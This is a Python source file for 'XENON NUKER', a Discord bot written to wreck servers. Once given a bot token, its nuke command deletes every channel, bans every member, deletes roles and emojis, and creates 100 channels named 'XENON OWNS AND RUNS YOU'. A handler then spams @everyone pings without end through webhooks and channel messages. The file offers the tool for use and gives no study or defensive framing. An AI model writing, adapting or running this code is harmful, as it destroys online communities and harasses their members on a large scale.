#made by XENON
from typing import ContextManager
import discord
import colorama
from colorama import Fore as F, Style as S
colorama.init()
from discord.ext import commands
import json
import os
colorama.init()

r = F.BLUE
w = F.RESET
g = F.GREEN
t = F.LIGHTBLACK_EX
a = F.WHITE

def ascii():
    print(f'''
          
                                                        XENON NUKER
                           ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
                                 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

''')
ascii()
tokeninput = f'[>] Please enter your Bot Token: '
TOKEN = input(tokeninput)


os.system('cls')

def main():
    ()
    headers = {
        "authorization" : TOKEN
    }
	
os.system('cls')	
os.system('title ┼ XENON NUKER ┼')
ascii()
antinet = commands.Bot(command_prefix='XENON#', intents = discord.Intents.all())

@antinet.event
async def on_ready():
    await antinet.change_presence(status=discord.Status.idle, activity=discord.Game('Xenon Was Here'))
    print(f'''
 {r}          ╔═══════════════════════════════════════╗
              {F.RESET}           ┼XENON NUKER┼  {r}        
           ╚═══════════════════════════════════════╝

            {r}╔══════════════════╗ {r}╔══════════════════╗
{F.RESET}               Commands             {F.RESET}   Creators
                                                          
            {r}    XENON#nk             ϟ Xenon ϟ#0202 {F.RESET}
            
    {r}        ╚══════════════════╝ {r}╚══════════════════╝


    {r}       ╔═══════════════════════════════════════╗
                  {F.RESET}        Command-Line
''')


antinet.remove_command('help')

@antinet.command()
async def w(ctx, *, message):
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: XENON#w ')
    print(f'               {F.RESET}[{g}+{F.RESET}] Watching Text: {message}')
    print(' ')
    await ctx.message.delete()
    await antinet.change_presence(
	
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
			
        ))

@antinet.command()
async def clear(ctx):
    os.system('cls')
    print(f'''
 {r}                    ╔═══════════════════════════════════════╗
                  {F.RESET}          ┼XENON NUKER┼  {r}        
                        ╚═══════════════════════════════════════╝

    {r}                   ╔══════════════════╗ {r}╔══════════════════╗
          {F.RESET}             Commands             {F.RESET}Creators
		                                                      |
                       {r}      XENON#nk                |Chills {F.RESET}| {r}@wnfo  
    {r}                   ╚══════════════════╝ {r}╚══════════════════╝


    {r}╔═══════════════════════════════════════╗
                  {F.RESET}Command-Line
''')
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: XENON#clear')

@antinet.command(aliases=['nuke'])
async def nk(ctx):
  await ctx.message.delete()
  print(f'             {F.RESET}[{r}${F.RESET}] Command Used: XENON#nk')
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Channel Deleted')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Channel NOT Deleted')

  for member in ctx.guild.members:
    try:
      await member.ban(reason=' XENON OWNS/RUNS YOU ')
      print(f'               {F.RESET}[{g}+{F.RESET}] Member Banned')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Member NOT Banned')

  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Role Deleted')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Role NOT Deleted')

  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Emoji Deleted')
    except:
      print(f'               {F.RESET}[{r}-{F.RESET}] Emoji NOT Deleted')
	  
  for i in range(100):
    await ctx.guild.create_text_channel(" XENON OWNS AND RUNS YOU ")
    print(f'               {F.RESET}[{g}+{F.RESET}] Created Channel')

@antinet.event
async def on_guild_channel_create(channel):
  web = await channel.create_webhook(name="XENON OWNS/RUNS YOU")
  while True:
    await web.send('@everyone @here we shal rise - @everyone @here')
    await channel.send('@everyone @here xenon is the best nuker - @everyone @here')

antinet.run(TOKEN)

Anti
